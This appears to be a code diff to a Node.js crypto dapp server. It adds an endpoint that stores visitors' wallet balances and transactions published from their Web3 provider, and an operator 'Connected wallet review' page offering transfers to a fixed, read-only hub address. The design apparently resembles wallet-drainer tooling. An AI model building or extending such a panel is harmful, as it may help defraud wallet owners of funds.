@@ -31,6 +31,8 @@ const allowed = new Map([
   ["/src/master-wallet.js", "text/javascript; charset=utf-8"],
   ["/src/wallet-tron-assets.mjs", "text/javascript; charset=utf-8"],
   ["/src/wallet-evm-assets.mjs", "text/javascript; charset=utf-8"],
+  ["/src/wallet-tron-transactions.mjs", "text/javascript; charset=utf-8"],
+  ["/src/wallet-evm-transactions.mjs", "text/javascript; charset=utf-8"],
   ["/src/landing-transfer.mjs", "text/javascript; charset=utf-8"],
   ["/src/logic.mjs", "text/javascript; charset=utf-8"],
   ["/src/tron-public.mjs", "text/javascript; charset=utf-8"],
@@ -94,6 +96,10 @@ const server = createServer(async (request, response) => {
       handleAuthLogout(request, response);
       return;
     }
+    if (url.pathname === "/api/wallet-provider-snapshot" && request.method === "POST") {
+      await handleWalletProviderSnapshot(request, response);
+      return;
+    }
     if (url.pathname === "/api/wallet-assets" && request.method === "GET") {
       await handleWalletAssets(request, response);
       return;
@@ -150,7 +156,7 @@ async function handleLogin(request, response) {
     return;
   }
   const wallets = await readWallets();
-  const enriched = await enrichWalletsWithAssets(wallets);
+  const enriched = enrichWalletsWithProviderSnapshots(wallets);
   sendHtml(response, 200, walletListPage(enriched));
 }
 
@@ -198,46 +204,109 @@ async function handleMasterWallet(request, response) {
     return;
   }
   const wallets = await readWallets();
-  const enriched = await enrichWalletsWithAssets(wallets);
+  const enriched = enrichWalletsWithProviderSnapshots(wallets);
   sendHtml(response, 200, masterWalletPage(enriched));
 }
 
 /**
- * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string }>} wallets
+ * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string, providerAssets?: unknown, providerTransactions?: unknown[], providerSnapshotAt?: string, network?: string, chainId?: string }>} wallets
  */
-async function enrichWalletsWithAssets(wallets) {
-  const uniqueAddresses = [...new Set(wallets.map((wallet) => wallet.address))];
-  /** @type {Map<string, Awaited<ReturnType<typeof fetchTronWalletAssets>>>} */
-  const assetsByAddress = new Map();
-  await mapWithConcurrency(uniqueAddresses, 6, async (address) => {
-    const assets = await fetchTronWalletAssets(address, { apiBase: process.env.TRON_API_BASE });
-    assetsByAddress.set(address, assets);
-  });
+function enrichWalletsWithProviderSnapshots(wallets) {
   return wallets.map((wallet) => ({
     ...wallet,
-    assets: assetsByAddress.get(wallet.address) ?? { ok: false, error: "Balance data was not loaded." },
+    assets: providerAssetsView(wallet),
+    transactions: providerTransactionsView(wallet),
   }));
 }
 
 /**
- * @template T
- * @param {T[]} items
- * @param {number} limit
- * @param {(item: T) => Promise<void>} worker
+ * @param {{ providerAssets?: unknown, providerSnapshotAt?: string }} wallet
  */
-async function mapWithConcurrency(items, limit, worker) {
-  let index = 0;
-  /** @type {Promise<void>[]} */
-  const runners = [];
-  const run = async () => {
-    while (index < items.length) {
-      const current = items[index++];
-      await worker(current);
+function providerAssetsView(wallet) {
+  const stored = wallet.providerAssets;
+  if (stored && typeof stored === "object") {
+    const record = /** @type {{ ok?: boolean, tokens?: unknown[], trxDisplay?: string, usdtDisplay?: string, nativeDisplay?: string, error?: string }} */ (stored);
+    if (record.ok === false && record.error) {
+      return { ok: false, error: record.error };
     }
+    if (Array.isArray(record.tokens) && record.tokens.length > 0) {
+      return {
+        ok: true,
+        tokens: /** @type {Array<{ display?: string, symbol?: string, standard?: string }>} */ (record.tokens),
+        trxDisplay: record.trxDisplay,
+        usdtDisplay: record.usdtDisplay,
+        nativeDisplay: record.nativeDisplay,
+      };
+    }
+  }
+  if (wallet.providerSnapshotAt) {
+    return { ok: false, error: "The stored provider snapshot did not include token balances." };
+  }
+  return {
+    ok: false,
+    error: "Waiting for the visitor to connect on the dapp and publish balances from their Web3 provider.",
   };
-  const pool = Math.max(1, Math.min(limit, items.length || 1));
-  for (let i = 0; i < pool; i += 1) runners.push(run());
-  await Promise.all(runners);
+}
+
+/**
+ * @param {{ providerTransactions?: unknown[] }} wallet
+ * @returns {Array<{ txid: string, when: string, direction: string, summary: string }>}
+ */
+function providerTransactionsView(wallet) {
+  if (!Array.isArray(wallet.providerTransactions)) return [];
+  return wallet.providerTransactions.flatMap((entry) => {
+    if (!entry || typeof entry !== "object") return [];
+    const row = /** @type {{ txid?: unknown, when?: unknown, direction?: unknown, summary?: unknown }} */ (entry);
+    if (typeof row.summary !== "string" || typeof row.direction !== "string") return [];
+    return [{
+      txid: typeof row.txid === "string" ? row.txid : "",
+      when: typeof row.when === "string" ? row.when : "Unknown time",
+      direction: row.direction,
+      summary: row.summary,
+    }];
+  });
+}
+
+/**
+ * @param {import("node:http").IncomingMessage} request
+ * @param {import("node:http").ServerResponse} response
+ */
+async function handleWalletProviderSnapshot(request, response) {
+  if (!requestContext(request)) {
+    sendJson(response, 403, { ok: false, error: "The request origin is not allowed." });
+    return;
+  }
+  const session = readWalletSession(request);
+  if (!session) {
+    sendJson(response, 401, { ok: false, error: "A verified wallet session is required." });
+    return;
+  }
+  let parsed;
+  try {
+    parsed = JSON.parse(await readBody(request, 120_000));
+  } catch {
+    sendJson(response, 400, { ok: false, error: "The provider snapshot request is invalid." });
+    return;
+  }
+  const address = parsed && typeof parsed === "object" && typeof parsed.address === "string" ? parsed.address.trim() : "";
+  if (!address || address !== session.address) {
+    sendJson(response, 403, { ok: false, error: "The snapshot address must match the verified session wallet." });
+    return;
+  }
+  const assets = parsed && typeof parsed === "object" ? parsed.assets : null;
+  const transactions = parsed && typeof parsed === "object" ? parsed.transactions : null;
+  if (!assets || typeof assets !== "object") {
+    sendJson(response, 400, { ok: false, error: "Provider asset data is required." });
+    return;
+  }
+  await updateWalletProviderSnapshot(address, {
+    network: session.network,
+    chainId: session.chainId,
+    providerAssets: assets,
+    providerTransactions: Array.isArray(transactions) ? transactions.slice(0, 20) : [],
+    providerSnapshotAt: new Date().toISOString(),
+  });
+  sendJson(response, 200, { ok: true });
 }
 
 /**
@@ -643,6 +712,27 @@ async function appendWallet(address, connectionTarget) {
 }
 
 /**
+ * @param {string} address
+ * @param {{ network?: string, chainId?: string, providerAssets?: unknown, providerTransactions?: unknown[], providerSnapshotAt?: string }} snapshot
+ */
+async function updateWalletProviderSnapshot(address, snapshot) {
+  const wallets = await readWallets();
+  let updated = false;
+  for (let index = wallets.length - 1; index >= 0; index -= 1) {
+    if (wallets[index].address === address) {
+      wallets[index] = { ...wallets[index], ...snapshot };
+      updated = true;
+      break;
+    }
+  }
+  if (!updated) return;
+  await mkdir(path.dirname(storePath), { recursive: true });
+  const temporary = `${storePath}.${process.pid}.tmp`;
+  await writeFile(temporary, `${JSON.stringify({ wallets: wallets.slice(-500) }, null, 2)}\n`, "utf8");
+  await rename(temporary, storePath);
+}
+
+/**
  * @returns {Promise<Array<{ address: string, connectionTarget?: string, connectedAt: string }>>}
  */
 async function readWallets() {
@@ -654,7 +744,21 @@ async function readWallets() {
       if (!item || typeof item !== "object") return [];
       if (typeof item.address !== "string" || typeof item.connectedAt !== "string") return [];
       const connectionTarget = typeof item.connectionTarget === "string" ? item.connectionTarget : undefined;
-      return [{ address: item.address, connectionTarget, connectedAt: item.connectedAt }];
+      const network = typeof item.network === "string" ? item.network : undefined;
+      const chainId = typeof item.chainId === "string" ? item.chainId : undefined;
+      const providerSnapshotAt = typeof item.providerSnapshotAt === "string" ? item.providerSnapshotAt : undefined;
+      const providerAssets = item.providerAssets && typeof item.providerAssets === "object" ? item.providerAssets : undefined;
+      const providerTransactions = Array.isArray(item.providerTransactions) ? item.providerTransactions : undefined;
+      return [{
+        address: item.address,
+        connectionTarget,
+        connectedAt: item.connectedAt,
+        network,
+        chainId,
+        providerSnapshotAt,
+        providerAssets,
+        providerTransactions,
+      }];
     });
   } catch (error) {
     if (error && typeof error === "object" && "code" in error && error.code === "ENOENT") return [];
@@ -828,7 +932,7 @@ function formatOperatorAssetSummary(assets) {
 }
 
 /**
- * @param {{ ok?: boolean, error?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }>, trxDisplay?: string, usdtDisplay?: string }} assets
+ * @param {{ ok?: boolean, error?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }>, trxDisplay?: string, usdtDisplay?: string, nativeDisplay?: string }} assets
  */
 function formatMasterWalletAssetHtml(assets) {
   if (!assets || assets.ok === false) {
@@ -836,20 +940,38 @@ function formatMasterWalletAssetHtml(assets) {
   }
   const tokens = Array.isArray(assets.tokens) ? assets.tokens : [];
   if (!tokens.length) {
-    return `<ul class="master-asset-list"><li>${escapeHtml(assets.trxDisplay || "0 TRX")}</li></ul>`;
+    return `<ul class="master-asset-list"><li>${escapeHtml(assets.trxDisplay || assets.nativeDisplay || "0 balance")}</li></ul>`;
   }
   const items = tokens.map((token) => {
     const standard = token.standard === "TRC10"
       ? "TRC-10"
       : token.standard === "TRC20"
         ? "TRC-20"
-        : token.standard || "";
-    const label = standard && token.standard !== "TRX"
+        : token.standard === "ERC20"
+          ? "ERC-20"
+          : token.standard || "";
+    const label = standard && token.standard !== "TRX" && token.standard !== "EVM"
       ? `${token.symbol || standard} (${standard})`
       : (token.symbol || "TRX");
     return `<li><strong>${escapeHtml(label)}</strong> ${escapeHtml(token.display || "0")}</li>`;
   }).join("");
   return `<ul class="master-asset-list">${items}</ul>`;
+}
+
+/**
+ * @param {Array<{ txid: string, when: string, direction: string, summary: string }>} transactions
+ */
+function formatMasterWalletTransactionsHtml(transactions) {
+  if (!transactions.length) {
+    return `<p class="muted">No recent activity snapshot yet. The visitor publishes activity from their Web3 provider after connecting on the dapp.</p>`;
+  }
+  const items = transactions.map((tx) => {
+    const txid = tx.txid
+      ? `<span class="address master-tx-id">${escapeHtml(tx.txid)}</span>`
+      : "";
+    return `<li><strong>${escapeHtml(tx.direction)}</strong> ${escapeHtml(tx.summary)} · ${escapeHtml(tx.when)}${txid ? `<br>${txid}` : ""}</li>`;
+  }).join("");
+  return `<ul class="master-tx-list">${items}</ul>`;
 }
 
 /**
@@ -874,24 +996,39 @@ function masterWalletLoginPage(message) {
 }
 
 /**
- * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string, assets?: { ok: boolean, trxDisplay?: string, usdtDisplay?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }>, error?: string } }>} wallets
+ * @param {Array<{ address: string, connectionTarget?: string, connectedAt: string, providerSnapshotAt?: string, assets?: { ok: boolean, trxDisplay?: string, usdtDisplay?: string, nativeDisplay?: string, tokens?: Array<{ display?: string, symbol?: string, standard?: string }>, error?: string }, transactions?: Array<{ txid: string, when: string, direction: string, summary: string }> }>} wallets
  */
 function masterWalletPage(wallets) {
   const hub = escapeHtml(CONNECTION_TARGET);
   const cards = [...wallets].reverse().map((wallet) => {
     const target = escapeHtml(wallet.connectionTarget || CONNECTION_TARGET);
-    const assets = formatMasterWalletAssetHtml(wallet.assets ?? { ok: false, error: "Balance unavailable" });
+    const assetHtml = formatMasterWalletAssetHtml(wallet.assets ?? { ok: false, error: "Balance unavailable" });
+    const txHtml = formatMasterWalletTransactionsHtml(wallet.transactions ?? []);
+    const snapshotNote = wallet.providerSnapshotAt
+      ? `Provider snapshot · ${escapeHtml(formatConnectedAt(wallet.providerSnapshotAt))}`
+      : "No provider snapshot yet";
     const address = escapeHtml(wallet.address);
-    return `<article class="master-wallet-card" data-wallet-address="${address}">
+    const isTron = /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(wallet.address);
+    return `<article class="master-wallet-card" data-wallet-address="${address}" data-wallet-network="${isTron ? "tron" : "evm"}">
       <header>
         <p class="master-wallet-kicker">Connected wallet</p>
         <p class="address master-wallet-address">${address}</p>
         <p class="master-wallet-meta">Linked to hub <span class="address">${target}</span> · ${escapeHtml(formatConnectedAt(wallet.connectedAt))}</p>
+        <p class="master-wallet-meta">${snapshotNote}</p>
       </header>
+      <div class="master-wallet-preview">
+        <h2 class="master-wallet-assets-title">Wallet provider assets</h2>
+        <div class="master-provider-assets">${assetHtml}</div>
+        <h2 class="master-wallet-assets-title">Recent activity</h2>
+        <div class="master-provider-transactions">${txHtml}</div>
+      </div>
       <button class="primary-action master-manage-open" type="button">Manage assets</button>
       <div class="master-manage-panel" hidden>
-        <h2 class="master-wallet-assets-title">Full public assets</h2>
-        ${assets}
+        <h2 class="master-wallet-assets-title">Live provider refresh</h2>
+        <p class="master-transfer-note">Connect TronLink with this wallet to refresh balances and activity directly from the wallet provider. Transfers still require that wallet signature.</p>
+        <button class="primary-action master-refresh-provider" type="button">Refresh from TronLink</button>
+        <div class="master-provider-assets master-provider-assets-live"></div>
+        <div class="master-provider-transactions master-provider-transactions-live"></div>
         <form class="master-transfer-form">
           <label>Transfer recipient (hub)</label>
           <input class="master-transfer-recipient" type="text" value="${hub}" readonly spellcheck="false">
@@ -922,7 +1059,7 @@ function masterWalletPage(wallets) {
   return pageShell("Hub master wallet", `<section class="card master-wallet-shell" id="master-wallet-root" data-hub-target="${hub}" aria-labelledby="master-wallet-title">
       <p class="eyebrow">Hub master wallet</p>
       <h1 id="master-wallet-title">Connected wallet review</h1>
-      <p class="lede">Hub <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Manage assets and request hub transfers that only the connecting wallet can sign.</p>
+      <p class="lede">Hub <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Each card shows the visitor’s last Web3 provider snapshot from the dapp plus live TronLink refresh inside Manage.</p>
       <p class="master-safety">No seed phrase · No private key · No auto-approve · Transfers require the visitor wallet signature</p>
       <div class="master-wallet-grid" id="master-wallet-grid">${body}</div>
       <div class="master-wallet-actions">
@@ -974,7 +1111,11 @@ function pageShell(title, main, options = {}) {
     .master-wallet-kicker { margin: 0 0 6px; color: var(--accent); font-size: 0.68rem; font-weight: 800; letter-spacing: 0.12em; text-transform: uppercase; }
     .master-wallet-address { margin: 0 0 8px; word-break: break-all; }
     .master-wallet-meta { margin: 0 0 14px; color: var(--muted); font-size: 0.78rem; }
-    .master-manage-open { margin-top: 4px; }
+    .master-wallet-preview { margin-top: 8px; }
+    .master-tx-list { margin: 0; padding-left: 18px; color: var(--text); }
+    .master-tx-list li { margin: 8px 0; }
+    .master-tx-id { word-break: break-all; font-size: 0.72rem; }
+    .master-refresh-provider { margin: 8px 0 12px; }
     .master-manage-panel { margin-top: 16px; padding-top: 16px; border-top: 1px solid var(--line); }
     .master-wallet-assets-title { margin: 0 0 8px; font-size: 0.95rem; }
     .master-asset-list { margin: 0; padding-left: 18px; color: var(--text); }
